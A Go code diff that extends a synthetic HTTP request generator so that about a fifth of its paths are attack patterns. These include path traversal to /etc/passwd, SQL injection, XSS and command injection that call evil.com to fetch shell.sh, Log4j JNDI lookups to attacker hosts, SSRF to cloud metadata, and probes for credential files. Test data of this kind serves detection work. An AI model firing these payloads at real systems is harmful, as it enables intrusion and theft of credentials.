@@ -266,7 +266,8 @@ func generateRequest(r *rand.Rand) string {
 	methods := []string{"GET", "POST", "PUT", "DELETE", "PATCH", "HEAD", "OPTIONS"}
 	method := methods[r.Intn(len(methods))] // #nosec G404
 
-	paths := []string{
+	// Normal paths
+	normalPaths := []string{
 		"/api/v1/users",
 		"/api/v1/orders",
 		"/health",
@@ -285,7 +286,89 @@ func generateRequest(r *rand.Rand) string {
 		"/api/v1/verification",
 	}
 
-	path := paths[r.Intn(len(paths))] // #nosec G404
+	// Security-focused paths (attack patterns)
+	attackPaths := []string{
+		// Directory traversal attacks
+		"/../../etc/passwd",
+		"/..%2f..%2f..%2fetc/passwd",
+		"/....//....//....//etc/shadow",
+		"/api/v1/files?path=../../../etc/passwd",
+		"/download?file=....//....//....//etc/hosts",
+		"/static/..%252f..%252f..%252fetc/passwd",
+
+		// SQL injection attempts
+		"/api/v1/users?id=1'%20OR%20'1'='1",
+		"/api/v1/search?q=';DROP%20TABLE%20users;--",
+		"/api/v1/login?user=admin'--&pass=x",
+		"/api/v1/products?category=1%20UNION%20SELECT%20password%20FROM%20users",
+		"/api/v1/orders?id=1;%20WAITFOR%20DELAY%20'00:00:10'",
+		"/api/v1/accounts?name='+OR+1=1--",
+
+		// XSS attempts
+		"/search?q=<script>alert('xss')</script>",
+		"/api/v1/comments?text=%3Cscript%3Edocument.location='http://evil.com/'%3C/script%3E",
+		"/profile?name=<img%20src=x%20onerror=alert(1)>",
+		"/api/v1/feedback?msg=<svg/onload=alert('XSS')>",
+
+		// Command injection
+		"/api/v1/ping?host=127.0.0.1;cat%20/etc/passwd",
+		"/api/v1/backup?file=test|wget%20http://evil.com/shell.sh",
+		"/cgi-bin/test.cgi?cmd=ls%20-la",
+		"/api/v1/convert?url=http://evil.com/$(whoami)",
+
+		// Scanner and reconnaissance
+		"/admin",
+		"/admin/login",
+		"/wp-admin/",
+		"/wp-login.php",
+		"/phpmyadmin/",
+		"/phpMyAdmin/",
+		"/.env",
+		"/.git/config",
+		"/.git/HEAD",
+		"/config.php",
+		"/web.config",
+		"/server-status",
+		"/server-info",
+		"/.aws/credentials",
+		"/.ssh/id_rsa",
+		"/backup.sql",
+		"/database.sql",
+		"/api/swagger.json",
+		"/actuator/env",
+		"/actuator/health",
+		"/debug/pprof/",
+		"/trace",
+		"/metrics",
+
+		// Authentication bypass attempts
+		"/api/v1/admin?admin=true",
+		"/api/v1/users?role=admin",
+		"/api/internal/debug",
+		"/api/v1/auth/bypass",
+
+		// SSRF attempts
+		"/api/v1/fetch?url=http://169.254.169.254/latest/meta-data/",
+		"/api/v1/proxy?target=http://localhost:6379/",
+		"/api/v1/webhook?callback=http://internal-service:8080/admin",
+		"/api/v1/image?src=file:///etc/passwd",
+
+		// Log4j/JNDI injection
+		"/api/v1/search?q=${jndi:ldap://evil.com/a}",
+		"/api/v1/user-agent?ua=${jndi:rmi://attacker.com:1099/exploit}",
+
+		// Shellshock
+		"/cgi-bin/test.sh",
+		"/cgi-bin/status",
+	}
+
+	// 20% chance of generating a security-focused path
+	var path string
+	if r.Float64() < 0.20 { // #nosec G404
+		path = attackPaths[r.Intn(len(attackPaths))] // #nosec G404
+	} else {
+		path = normalPaths[r.Intn(len(normalPaths))] // #nosec G404
+	}
 
 	protocols := []string{"HTTP/1.0", "HTTP/1.1", "HTTP/2.0"}
 	protocol := protocols[r.Intn(len(protocols))] // #nosec G404
